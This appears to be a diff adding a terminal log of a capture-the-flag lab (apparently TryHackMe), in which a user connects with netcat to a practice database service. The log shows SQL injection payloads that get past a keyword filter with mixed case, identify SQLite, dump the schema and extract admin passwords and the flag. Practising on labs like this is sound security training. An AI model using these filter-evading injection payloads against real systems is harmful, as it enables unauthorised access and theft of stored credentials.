@@ -1,0 +1,46 @@
+─(white㉿white)-[~/white/Documents/thm]
+└─$ nc 10.49.159.237 1337
+Welcome to the Light database!
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: '
+Error: unrecognized token: "''' LIMIT 30"
+Please enter your username: ' UNION SELECT 1 -- -
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: ' UNION SELECT 1 #
+Ahh there is a word in there I don't like :(
+Please enter your username: ' UniOn SELECT 1 #
+Ahh there is a word in there I don't like :(
+Please enter your username: ' UniOn SeLeCt 1 #
+Error: unrecognized token: "#"
+Please enter your username: ' UniOn SeLeCt 1 %23
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: SELECT * FROM users WHERE username = '{user_input}' LIMIT 30; 
+Ahh there is a word in there I don't like :(
+Please enter your username: SELECT * FROM users WHERE username = ''' LIMIT 30;
+Ahh there is a word in there I don't like :(
+Please enter your username: ' UniOn SeLeCt 1 '
+Password: 1
+Please enter your username: ' UniOn SeLeCt @@version '
+Error: unrecognized token: "@"
+Please enter your username: ' UniOn SeLeCt version() '
+Error: no such function: version
+Please enter your username: ' UniOn SeLeCt sqlite_version() '
+Password: 3.31.1
+Please enter your username: ' UniOn SeLeCt group_concat(sql) FROM sqlite_master '
+Password: CREATE TABLE usertable (
+                   id INTEGER PRIMARY KEY,
+                   username TEXT,
+                   password INTEGER),CREATE TABLE admintable (
+                   id INTEGER PRIMARY KEY,
+                   username TEXT,
+                   password INTEGER)
+Please enter your username: ' UniOn SeLeCt group_concat(username) FROM usertable '
+Password: alice,rob,john,michael,smokey,hazel,ralph,steve
+Please enter your username: ' UniOn SeLeCt group_concat(username) FROM admintable '
+Password: TryHackMeAdmin,flag
+Please enter your username: ' UniOn SeLeCt group_concat(password) FROM admintable '
+Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}
+Please enter your username: 
